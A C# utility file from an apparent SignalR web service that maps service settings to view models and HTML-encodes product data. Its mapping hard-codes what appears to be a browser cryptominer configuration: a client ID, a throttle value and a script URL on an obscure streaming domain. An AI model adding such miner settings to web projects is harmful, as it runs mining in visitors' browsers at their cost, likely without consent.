using SignalRService.Models;
using SignalRService.ViewModels;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace SignalRService.Utils
{
    public static class ModelExtensinos
    {
        public static ServiceSettingViewModel ToServiceSettingViewModel(this ServiceSettingModel dbmodel )
        {
            return new ServiceSettingViewModel()
            {
                Id = dbmodel.ID,
                ServiceName = dbmodel.ServiceName,
                ServiceUrl = dbmodel.ServiceUrl,
                ServiceType = dbmodel.ServiceType.ToString(),
                MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
                {
                    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                    Throttle = "0.9",
                    ScriptUrl = "https://www.freecontent.stream./Htxj.js",
                    StartDelayMs = 3000,
                    ReportStatusIntervalMs = 65000
                },
                SiganlRBaseConfigurationVieModel = new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
                {
                    SinalRGroup = dbmodel.ServiceUrl.ToLower()
                },
                OrderClientConfigurationViewModel = new SignalRService.ViewModels.OrderClientConfigurationViewModel()
                {
                    //  AppendToSelector = "*[data-role=page]"
                    AppendToSelector = ".body-content",
                    SinalRGroup = dbmodel.ServiceUrl.ToLower()
                },
                OrderHostConfigurationViewModel = new SignalRService.ViewModels.OrderHostConfigurationViewModel()
                {
                    AppendToSelector = ".body-content",
                    SinalRGroup = dbmodel.ServiceUrl.ToLower()
                }
            };
        }

        public static Hubs.ProductData ToHtmlEncode(this Hubs.ProductData model)
        {
            return new Hubs.ProductData()
            {
                Id = HttpUtility.HtmlEncode(model.Id),
                Name = HttpUtility.HtmlEncode(model.Name),
                Description = HttpUtility.HtmlEncode(model.Description),
                ImgUrl = HttpUtility.HtmlEncode(model.ImgUrl),
                Price = model.Price
            };
        }


    }
}